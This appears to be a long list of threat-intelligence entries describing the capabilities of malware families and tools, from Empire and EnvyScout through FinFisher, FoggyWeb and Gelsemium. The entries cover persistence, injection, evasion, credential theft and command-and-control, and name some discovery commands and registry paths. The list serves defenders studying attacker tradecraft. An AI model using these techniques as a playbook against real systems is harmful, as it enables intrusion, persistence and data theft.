Empire leverages PowerShell for the majority of its client-side agent tasks. Empire also contains the ability to conduct PowerShell remoting with the &lt;code&gt;Invoke-PSRemoting&lt;/code&gt; module.
Empire can use modules like &lt;code&gt;Invoke-SessionGopher&lt;/code&gt; to extract private key and session information.
Empire can find information about processes running on local and remote systems.
Empire contains multiple modules for injecting into processes, such as &lt;code&gt;Invoke-PSInject&lt;/code&gt;.
Empire can modify the registry run keys &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; and &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; for persistence.
Empire can add a SID-History to a user if on a domain controller.
Empire contains modules for executing commands over SSH as well as in-memory VNC agent injection.
Empire has modules to interact with the Windows task scheduler.
Empire is capable of capturing screenshots on Windows and macOS systems.
Empire can enumerate antivirus software on the target.
Empire can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's &lt;code&gt;Install-SSP&lt;/code&gt; and &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; to install malicious SSPs and log authentication events.
Empire can use PsExec to execute a payload on a remote host.
Empire can persist by modifying a .LNK file to include a backdoor.
Empire can leverage its implementation of Mimikatz to obtain and use silver tickets.
Empire can enumerate host system information like OS, architecture, domain name, applied patches, and more.
Empire can acquire network configuration information like DNS servers, public IP, and network proxies used by a host.
Empire can enumerate the current network connections of a host.
Empire can enumerate the username on targeted hosts.
Empire can timestomp any files or payloads placed on a target machine to help them blend in.
Empire can capture webcam data on Windows and macOS systems.
Empire can conduct command and control over protocols like HTTP and HTTPS.
Empire has modules for executing scripts.
Empire can use WMI to deliver a payload to a remote host.
Empire can utilize built-in modules to modify service binaries and restore them to their original state.
EnvyScout can collect sensitive NTLM material from a compromised host.
EnvyScout can deobfuscate and write malicious ISO files to disk.
EnvyScout can Base64 encode payloads.
EnvyScout can call &lt;code&gt;window.location.pathname&lt;/code&gt; to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.
EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.
EnvyScout contains JavaScript code that can extract an encoded blob from its HTML body and write it to disk.
EnvyScout can use hidden directories and files to hide malicious executables.
EnvyScout can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.
EnvyScout has been executed through malicious files attached to e-mails.
EnvyScout has used folder icons for malicious files to lure victims into opening them.
EnvyScout has the ability to proxy execution of malicious files with Rundll32.
EnvyScout has been distributed via spearphishing as an email attachment.
EnvyScout can determine whether the ISO payload was received by a Windows or iOS device.
EnvyScout can use cmd.exe to execute malicious files on compromised hosts.
Epic encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.
Epic compresses the collected data with bzip2 before sending it to the C2 server.
Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper.
Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.
Epic has a command to delete a file from the machine.
Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\Temp directories.
Epic gathers a list of all user accounts, privilege classes, and time of last logon.
Epic gathers information on local group names.
Epic heavily obfuscates its code to make analysis more difficult.
Epic uses the &lt;code&gt;tasklist /v&lt;/code&gt; command to obtain a list of processes.
Epic uses the &lt;code&gt;rem reg query&lt;/code&gt; command to obtain values from Registry keys.
Epic uses the &lt;code&gt;net view&lt;/code&gt; command on the victim’s machine.
Epic searches for anti-malware services running on the victim’s machine and terminates itself if it finds them.
Epic encrypts commands from the C2 server using a hardcoded key.
Epic collects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.
Epic uses the &lt;code&gt;nbtstat -n&lt;/code&gt; and &lt;code&gt;nbtstat -s&lt;/code&gt; commands on the victim’s machine.
Epic uses the &lt;code&gt;net use&lt;/code&gt;, &lt;code&gt;net session&lt;/code&gt;, and &lt;code&gt;netstat&lt;/code&gt; commands to gather information on network connections.
Epic collects the user name from the victim’s machine.
Epic uses the &lt;code&gt;tasklist /svc&lt;/code&gt; command to list the services on the system.
Epic uses the &lt;code&gt;net time&lt;/code&gt; command  to get the system time from the machine and collect the current date and time zone information.
Epic uses HTTP and HTTPS for C2 communications.
EvilBunny has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.
EvilBunny has deleted the initial dropper after running through the environment checks.
EvilBunny has downloaded additional Lua scripts from the C2.
EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.
EvilBunny has used EnumProcesses() to identify how many process are running in the environment.
EvilBunny has created Registry keys for persistence in &lt;code&gt;[HKLM|HKCU]\…\CurrentVersion\Run&lt;/code&gt;.
EvilBunny has executed commands via scheduled tasks.
EvilBunny has been observed querying installed antivirus software.
EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.
EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox.
EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.
EvilBunny has executed C2 commands directly via HTTP.
EvilBunny has an integrated scripting engine to download and execute Lua scripts.
EvilBunny has used WMI to gather information about the system.
EvilGrab has the capability to capture audio from a victim machine.
EvilGrab has the capability to capture keystrokes.
EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence.
EvilGrab has the capability to capture screenshots.
EvilGrab has the capability to capture video from a victim machine.
Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.
Exaramel for Linux uses crontab for persistence if it does not have root privileges.
Exaramel for Linux can decrypt its configuration file.
Exaramel for Linux uses RC4 for encrypting the configuration.
Exaramel for Linux can attempt to find a new C2 server if it receives an error.
Exaramel for Linux can uninstall its persistence mechanism and delete its configuration file.
Exaramel for Linux has a command to download a file from  and to a remote C2 server.
Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality.
Exaramel for Linux can run &lt;code&gt;whoami&lt;/code&gt; to identify the system owner.
Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
Exaramel for Linux has a command to execute a shell command on the system.
Exaramel for Linux uses HTTPS for C2 communications.
Exaramel for Windows automatically encrypts files before sending them to the C2 server.
Exaramel for Windows stores the backdoor's configuration in the Registry in XML format.
Exaramel for Windows specifies a path to store files scheduled for exfiltration.
The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV” in an apparent attempt to masquerade as a legitimate service.
Exaramel for Windows adds the configuration to the Registry in XML format.
Exaramel for Windows has a command to execute VBS scripts on the victim’s machine.
Exaramel for Windows has a command to launch a remote shell and executes commands on the victim’s machine.
The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV.”
Expand can be used to decompress a local or remote CAB file into an executable.
Expand can be used to download or upload a file over a network share.
Expand can be used to download or copy a file into an alternate data stream.
Explosive has a function to use the OpenClipboard wrapper.
Explosive can scan all .exe files located in the USB drive.
Explosive has commonly set file and path attributes to hidden.
Explosive has a function to download a file to the infected system.
Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers.
Explosive has a function to write itself to Registry values.
Explosive has a function to call the OpenClipboard wrapper.
Explosive has encrypted communications with the RC4 method.
Explosive has collected the computer name from the infected host.
Explosive has collected the MAC address from the victim's machine.
Explosive has collected the username from the infected host.
Explosive has used HTTP for communication.
FALLCHILL can delete malware and associated artifacts from the victim.
FALLCHILL can search files on a victim.
FALLCHILL uses fake Transport Layer Security (TLS) to communicate with its C2 server.
FALLCHILL encrypts C2 data with RC4 encryption.
FALLCHILL can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.
FALLCHILL collects MAC address and local IP address information from the victim.
FALLCHILL can modify file or directory timestamps.
FALLCHILL has been installed as a Windows service.
FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server.
FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.
FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components.
FELIXROOT downloads and uploads files to and from the victim’s machine.
FELIXROOT deletes the Registry key &lt;code&gt;HKCU\Software\Classes\Applications\rundll32.exe\shell\open&lt;/code&gt;.
FELIXROOT collects a list of running processes.
FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry.
FELIXROOT adds a shortcut file to the startup folder for persistence.
FELIXROOT uses Rundll32 for executing the dropper program.
FELIXROOT checks for installed security software like antivirus and firewall.
FELIXROOT creates a .LNK file for persistence.
FELIXROOT collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.
FELIXROOT collects information about the network including the IP address and DHCP server.
FELIXROOT collects the username from the victim’s machine.
FELIXROOT gathers the time zone information from the victim’s machine.
FELIXROOT uses HTTP and HTTPS to communicate with the C2 server.
FELIXROOT executes batch scripts on the victim’s machine, and can launch a reverse shell for command execution.
FELIXROOT uses WMI to query the Windows Registry.
FIVEHANDS can receive a command line argument to limit file encryption to specified directories.
FIVEHANDS can use an embedded NTRU public key to encrypt data for ransom.
FIVEHANDS has the ability to decrypt its payload prior to execution.
The FIVEHANDS payload is encrypted with AES-128.
FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.
FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.
FIVEHANDS can enumerate network shares and mounted drives on a network.
FIVEHANDS can use WMI to delete files on a  target machine.
FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.
FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.
FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.
FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.
FLASHFLOOD stages data it copies from the local system or removable drives in the "%WINDIR%\$NtUninstallKB885884$\" directory.
FLASHFLOOD achieves persistence by making an entry in the Registry's Run key.
FLIPSIDE uses RDP to tunnel traffic from a victim environment.
FRAMESTING can embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in `/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.`
FRAMESTING can send and receive zlib compressed data within `POST` requests.
FRAMESTING can decompress data received within `POST` requests.
FRAMESTING uses a cookie named `DSID` to mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions.
FRAMESTING is a Python web shell that can embed in the Ivanti Connect Secure CAV Python package.
FRAMESTING can retrieve C2 commands from values stored in the `DSID` cookie from the current HTTP request or from decompressed zlib data within the request's `POST` data.
FRAMESTING is a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs.
FYAnti has the ability to decrypt an embedded .NET module.
FYAnti can search the &lt;code&gt;C:\Windows\Microsoft.NET\&lt;/code&gt; directory for files of a specified size.
FYAnti can download additional payloads to a compromised host.
FYAnti has used ConfuserEx to pack its .NET module.
FakeM contains a keylogger module.
Some variants of FakeM use SSL to communicate with C2 servers.
FakeM C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants of FakeM use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.
The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. Some variants of FakeM use RC4 to encrypt C2 traffic.
FatDuke has been packed with junk code and strings.
FatDuke can copy files and directories from a compromised host.
FatDuke can decrypt AES encrypted C2 communications.
FatDuke has used several C2 servers per targeted organization.
FatDuke can secure delete its DLL.
FatDuke can enumerate directories on target machines.
FatDuke can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.
FatDuke has attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.
FatDuke can call &lt;code&gt;ShellExecuteW&lt;/code&gt; to open the default browser on the URL localhost.
FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation.
FatDuke has the ability to execute PowerShell scripts.
FatDuke can list running processes on the localhost.
FatDuke can get user agent strings for the default browser from &lt;code&gt;HKCU\Software\Classes\http\shell\open\command&lt;/code&gt;.
FatDuke has used &lt;code&gt;HKLM\SOFTWARE\Microsoft\CurrentVersion\Run&lt;/code&gt; to establish persistence.
FatDuke can execute via rundll32.
FatDuke has been regularly repacked by its operators to create large binaries and evade detection.
FatDuke can AES encrypt C2 communications.
FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host.
FatDuke can identify the MAC address on the target computer.
FatDuke can turn itself on or off at random intervals.
FatDuke can be controlled via a custom C2 protocol over HTTP.
Felismus can download files from remote servers.
Felismus has masqueraded as legitimate Adobe Content Management System files.
Felismus checks for processes associated with anti-virus vendors.
Some Felismus samples use a custom method for C2 traffic that utilizes Base64.
Some Felismus samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.
Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.
Felismus collects the victim LAN IP address and sends it to the C2 server.
Felismus collects the current username and sends it to the C2 server.
Felismus uses HTTP for C2.
Felismus uses command line for execution.
Ferocious can use COM hijacking to establish persistence.
Ferocious can delete files from a compromised host.
Ferocious has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.
Ferocious can run &lt;code&gt;GET.WORKSPACE&lt;/code&gt; in Microsoft Excel to check if a mouse is present.
Ferocious can use PowerShell scripts for execution.
Ferocious has checked for AV software as part of its persistence process.
Ferocious can run anti-sandbox checks using the Microsoft Excel 4.0 function &lt;code&gt;GET.WORKSPACE&lt;/code&gt; to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.
Ferocious can use &lt;code&gt;GET.WORKSPACE&lt;/code&gt; in Microsoft Excel to determine the OS version of the compromised host.
Ferocious has the ability to use Visual Basic scripts for execution.
Fgdump can dump Windows password hashes.
FinFisher contains junk code in its functions in an effort to confuse disassembly programs.
Some FinFisher variants incorporate an MBR rootkit.
FinFisher performs UAC bypass.
FinFisher clears the system event logs using &lt;code&gt; OpenEventLog/ClearEventLog APIs &lt;/code&gt;.
FinFisher hooks processes by modifying IAT pointers to CreateWindowEx.
A FinFisher variant uses DLL search order hijacking.
FinFisher uses DLL side-loading to load malicious programs.
FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.
FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.
FinFisher enumerates directories and scans for certain files.
FinFisher has used the &lt;code&gt;KernelCallbackTable&lt;/code&gt; to hijack the execution flow of a process by replacing the &lt;code&gt;__fnDWORD&lt;/code&gt; function with the address of a created Asynchronous Procedure Call stub routine.
FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.
FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.
FinFisher checks its parent process for indications that it is running in a sandbox setup.
FinFisher queries Registry values as part of its anti-sandbox checks.
FinFisher establishes persistence by creating the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\Run&lt;/code&gt;.
FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.
FinFisher probes the system to check for antimalware processes.
A FinFisher variant uses a custom packer.
FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.
FinFisher checks if the victim OS is 32 or 64-bit.
FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.
FinFisher creates a new Windows service with the malicious executable for persistence.
Final1stspy uses Python code to deobfuscate base64-encoded strings.
Final1stspy obfuscates strings with base64 encoding.
Final1stspy obtains a list of running processes.
Final1stspy creates a Registry Run key to establish persistence.
Final1stspy obtains victim Microsoft Windows version information and CPU architecture.
Final1stspy uses HTTP for C2.
Flagpro can check the name of the window displayed on the system.
Flagpro can collect data from a compromised host, including Windows authentication information.
Flagpro has exfiltrated data to the C2 server.
Flagpro can close specific Windows Security and Internet Explorer dialog boxes to mask external connections.
Flagpro can download additional malware from the C2 server.
Flagpro has been used to execute the &lt;code&gt;net localgroup administrators&lt;/code&gt; command on a targeted system.
Flagpro has relied on users clicking a malicious attachment delivered through spearphishing.
Flagpro can download malicious files with a .tmp extension and append them with .exe prior to execution.
Flagpro can use Native API to enable obfuscation including `GetLastError` and `GetTickCount`.
Flagpro has been used to execute `net view` to discover mapped network shares.
Flagpro has been delivered within ZIP or RAR password-protected archived files.
Flagpro has been used to run the &lt;code&gt;tasklist&lt;/code&gt; command on a compromised system.
Flagpro has dropped an executable file to the startup directory.
Flagpro has been used to execute &lt;code&gt;net view&lt;/code&gt; on a targeted system.
Flagpro has the ability to wait for a specified time interval between communicating with and executing commands from C2.
Flagpro has been distributed via spearphishing as an email attachment.
Flagpro has encoded bidirectional data communications between a target system and C2 server using Base64.
Flagpro can check whether the target system is using Japanese, Taiwanese, or English through detection of specific Windows Security and Internet Explorer dialog.
Flagpro has been used to execute the &lt;code&gt;ipconfig /all&lt;/code&gt; command on a victim system.
Flagpro has been used to execute &lt;code&gt;netstat -ano&lt;/code&gt; on a compromised host.
Flagpro has been used to run the &lt;code&gt;whoami&lt;/code&gt; command on the system.
Flagpro can execute malicious VBA macros embedded in .xlsm files.
Flagpro can communicate with its C2 using HTTP.
Flagpro can use `cmd.exe` to execute commands received from C2.
Flame can record audio using any existing hardware recording devices.
Flame can use Windows Authentication Packages for persistence.
Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.
Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.
Flame can create backdoor accounts with login “HelpAssistant” on domain connected systems if appropriate rights are available.
Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.
Rundll32.exe is used as a way of executing Flame at the command-line.
Flame can take regular screenshots when certain applications are open that are sent to the command and control server.
Flame identifies security software such as antivirus through the Security module.
FlawedAmmyy can collect clipboard data.
FlawedAmmyy may obfuscate portions of the initial C2 handshake.
FlawedAmmyy has collected information and files from a compromised machine.
FlawedAmmyy has sent data collected from a compromised host to its C2 servers.
FlawedAmmyy can execute batch scripts to delete files.
FlawedAmmyy can transfer files from C2.
FlawedAmmyy can collect mouse events.
FlawedAmmyy can collect keyboard events.
FlawedAmmyy enumerates the privilege level of the victim during the initial infection.
FlawedAmmyy has been installed via `msiexec.exe`.
FlawedAmmyy will attempt to detect if a usable smart card is current inserted into a card reader.
FlawedAmmyy has used PowerShell to execute commands.
FlawedAmmyy has established persistence via the `HKCU\SOFTWARE\microsoft\windows\currentversion\run` registry key.
FlawedAmmyy has used `rundll32` for execution.
FlawedAmmyy can capture screenshots.
FlawedAmmyy will attempt to detect anti-virus products during the initial infection.
FlawedAmmyy has used SEAL encryption during the initial C2 handshake.
FlawedAmmyy can collect the victim's operating system and computer name during the initial infection.
FlawedAmmyy enumerates the current user during the initial infection.
FlawedAmmyy has used HTTP for C2.
FlawedAmmyy has used `cmd` to execute commands on a compromised host.
FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.
FlawedGrace encrypts its C2 configuration files with AES in CBC mode.
FoggyWeb can use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also, FoggyWeb can encode C2 command output within a legitimate WebP file.
FoggyWeb can invoke the `Common.Compress` method to compress data with the C# GZipStream compression class.
FoggyWeb can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.
FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate `version.dll` during the `Microsoft.IdentityServer.ServiceHost.exe` execution process.
FoggyWeb can retrieve configuration data from a compromised AD FS server.
FoggyWeb can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.
FoggyWeb has been XOR-encoded.
FoggyWeb can remotely exfiltrate sensitive information from a compromised AD FS server.
FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server.
FoggyWeb can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.
FoggyWeb can masquerade the output of C2 commands as a fake, but legitimately formatted WebP file.
FoggyWeb can be disguised as a Visual Studio file such as `Windows.Data.TimeZones.zh-PH.pri` to evade detection. Also, FoggyWeb's loader can mimic a genuine `dll` file that carries out the same import functions as the legitimate Windows `version.dll` file.
FoggyWeb's loader can use API functions to load the FoggyWeb backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.
FoggyWeb can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.
FoggyWeb can retrieve token signing certificates and token decryption certificates from a compromised AD FS server.
FoggyWeb's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's &lt;code&gt;Microsoft.IdentityServer.ServiceHost.exe&lt;/code&gt; process.
FoggyWeb's loader has reflectively loaded .NET-based assembly/payloads into memory.
FoggyWeb's loader can call the &lt;code&gt;load()&lt;/code&gt; function to load the FoggyWeb dll into an Application Domain on a compromised AD FS server.
FoggyWeb has used a dynamic XOR key and custom XOR methodology for C2 communications.
FoggyWeb can allow abuse of a compromised AD FS server's SAML token.
FoggyWeb has the ability to communicate with C2 servers over HTTP GET/POST requests.
Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).
Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)
Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd.
FrameworkPOS can XOR credit card information before exfiltration.
FrameworkPOS can collect elements related to credit card data from process memory.
FrameworkPOS can use DNS tunneling for exfiltration of credit card data.
FrameworkPOS can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\Windows\.
FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.
FruitFly executes and stores obfuscated Perl scripts.
FruitFly will delete files on the system.
FruitFly looks for specific files and file types.
FruitFly saves itself with a leading "." to make it a hidden file.
FruitFly persists via a Launch Agent.
FruitFly has the ability to list processes on the system.
FruitFly takes screenshots of the user's desktop.
FunnyDream has the ability to discover application windows via execution of `EnumWindows`.
FunnyDream has compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line or `qwerasdf` if the command line argument doesn’t contain the key. File names are obfuscated using XOR with the same key as the compressed file content.
FunnyDream has compressed collected files with zLib.
FunnyDream can monitor files for changes and automatically collect them.
FunnyDream can use com objects identified with `CLSID_ShellLink`(`IShellLink` and `IPersistFile`) and `WScript.Shell`(`RegWrite` method) to enable persistence mechanisms.
FunnyDream can send compressed and obfuscated packets to C2.
FunnyDream can upload files from victims' machines.
The FunnyDream FilePakMonitor component has the ability to collect files from removable devices.
The FunnyDream FilepakMonitor component can inject into the Bka.exe process using the `VirtualAllocEx`, `WriteProcessMemory` and `CreateRemoteThread` APIs to load the DLL component.
FunnyDream can Base64 encode its C2 address stored in a template binary with the `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-` or
`xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=` character sets.
FunnyDream can execute commands, including gathering user information, and send the results to C2.
FunnyDream can delete files including its dropper component.
FunnyDream can identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection.
FunnyDream has the ability to clean traces of malware deployment.
FunnyDream can download additional files onto a compromised host.
The FunnyDream Keyrecord component can capture keystrokes.
FunnyDream can stage collected information including screen captures and logged keystrokes locally.
FunnyDream has used a service named `WSearch` for execution.
FunnyDream can use Native API for defense evasion, discovery, and collection.
FunnyDream can communicate with C2 over TCP and UDP.
The FunnyDream FilepakMonitor component can detect removable drive insertion.
FunnyDream has the ability to discover processes, including `Bka.exe` and `BkavUtil.exe`.
FunnyDream can connect to HTTP proxies via TCP to create a tunnel to C2.
FunnyDream can identify and use configured proxies in a compromised network for C2 communication.
FunnyDream can check `Software\Microsoft\Windows\CurrentVersion\Internet Settings` to extract the `ProxyServer` string.
FunnyDream can use a Registry Run Key and the Startup folder to establish persistence.
FunnyDream can collect information about hosts on the victim network.
FunnyDream can use `rundll32` for execution of its components.
The FunnyDream ScreenCap component can take screenshots on a compromised host.
FunnyDream can identify the processes for Bkav antivirus.
FunnyDream can enumerate all logical drives on a targeted machine.
FunnyDream can parse the `ProxyServer` string in the Registry to discover http proxies.
FunnyDream has the ability to gather user information from the targeted system using `whoami/upn&amp;whoami/fqdn&amp;whoami/logonid&amp;whoami/all`.
FunnyDream can check system time to help determine when changes were made to specified files.
FunnyDream can use `cmd.exe` for execution on remote hosts.
FunnyDream can use WMI to open a Windows command shell on a remote machine.
FunnyDream has established persistence by running `sc.exe` and by setting the `WSearch` service to run automatically.
Fysbis has been encrypted using XOR and RC4.
Fysbis has the ability to delete files.
Fysbis has the ability to search for files.
Fysbis can perform keylogging.
Fysbis has masqueraded as the rsyncd and dbus-inotifier services.
Fysbis has masqueraded as trusted software rsyncd and dbus-inotifier.
Fysbis can collect information about running processes.
Fysbis can use Base64 to encode its C2 traffic.
Fysbis has used the command &lt;code&gt;ls /etc | egrep -e"fedora\*|debian\*|gentoo\*|mandriva\*|mandrake\*|meego\*|redhat\*|lsb-\*|sun-\*|SUSE\*|release"&lt;/code&gt; to determine which Linux OS version is running.
Fysbis has established persistence using a systemd service.
Fysbis has the ability to create and execute commands in a remote shell for CLI.
If executing without root privileges, Fysbis adds a `.desktop` configuration file to the user's `~/.config/autostart` directory.
GLASSTOKEN has the ability to decode hexadecimal and Base64 C2 requests.
GLASSTOKEN can use PowerShell for command execution.
GLASSTOKEN has hexadecimal and Base64 encoded C2 content.
GLASSTOKEN is a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs.
GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol.
GRIFFON has used a reconnaissance module that can be used to retrieve Windows domain membership information.
GRIFFON is written in and executed as JavaScript.
GRIFFON has used PowerShell to execute the Meterpreter downloader TinyMet.
GRIFFON has used a persistence module that stores the implant inside the Registry, which executes at logon.
GRIFFON has used &lt;code&gt;sctasks&lt;/code&gt; for persistence.
GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system.
GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .
GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.
Gazer uses custom encryption for C2 that uses RSA.
Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for "Solid Loop Ltd," and another was issued for "Ultimate Computer Support Ltd."
Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.
Gazer has commands to delete files and persistence mechanisms from the victim.
Gazer can execute a task to download a file.
Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.
Gazer injects its communication module into an Internet accessible process through which it performs C2.
Gazer can establish persistence by creating a .lnk file in the Start menu.
Gazer can establish persistence by creating a scheduled task.
Gazer can establish persistence through the system screensaver by configuring it to execute the malware.
Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.
Gazer uses custom encryption for C2 that uses 3DES.
Gazer obtains the current user's security identifier.
Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.
For early Gazer versions, the compilation timestamp was faked.
Gazer communicates with its C2 servers over HTTP.
Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;.
Gelsemium can use token manipulation to bypass UAC on Windows7 systems.
Gelsemium can use junk code to hide functions and evade detection.
Gelsemium can bypass UAC to elevate process privileges on a compromised host.
Gelsemium can use the `IARPUinstallerStringLauncher` COM interface are part of its UAC bypass process.
Gelsemium has the ability to use DNS in communication with C2.
Gelsemium can collect data from a compromised host.
Gelsemium can decompress and decrypt DLLs and shellcode.
Gelsemium can use dynamic DNS domain names in C2.
Gelsemium has the ability to inject DLLs into specific processes.
Gelsemium has the ability to compress its components.
Gelsemium can use multiple domains and protocols in C2.
Gelsemium can delete its dropper component from the targeted system.
Gelsemium can retrieve data from specific Windows directories, as well as open random files as part of Virtualization/Sandbox Evasion.
Gelsemium can store its components in the Registry.
Gelsemium can download additional plug-ins to a compromised host.
Gelsemium has used unverified signatures on malicious DLLs.
Gelsemium has named malicious binaries `serv.exe`, `winprint.dll`, and `chrome_elf.dll` and has set its persistence in the Registry with the key value &lt;code&gt;Chrome Update&lt;/code&gt; to appear legitimate.
Gelsemium can modify the Registry to store its components.
Gelsemium has the ability to use various Windows API functions to perform tasks.
Gelsemium has the ability to use TCP and UDP in C2 communications.
Gelsemium can drop itself in &lt;code&gt;C:\Windows\System32\spool\prtprocs\x64\winprint.dll&lt;/code&gt; to be loaded automatically by the spoolsv Windows service.
Gelsemium can enumerate running processes.
Gelsemium can open random files and Registry keys to obscure malware behavior from sandbox analysis.
Gelsemium can use custom shellcode to map embedded DLLs into memory.
Gelsemium can set persistence with a Registry run key.
Gelsemium can check for the presence of specific security products.
Gelsemium can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.
Gelsemium has the ability to distinguish between a standard user and an administrator on a compromised host.
Gelsemium has the ability to perform timestomping of files on targeted systems.
Gelsemium can use junk code to generate random activity to obscure malware behavior.
Gelsemium can use HTTP/S in C2 communications.
Gelsemium can use a batch script to delete itself.
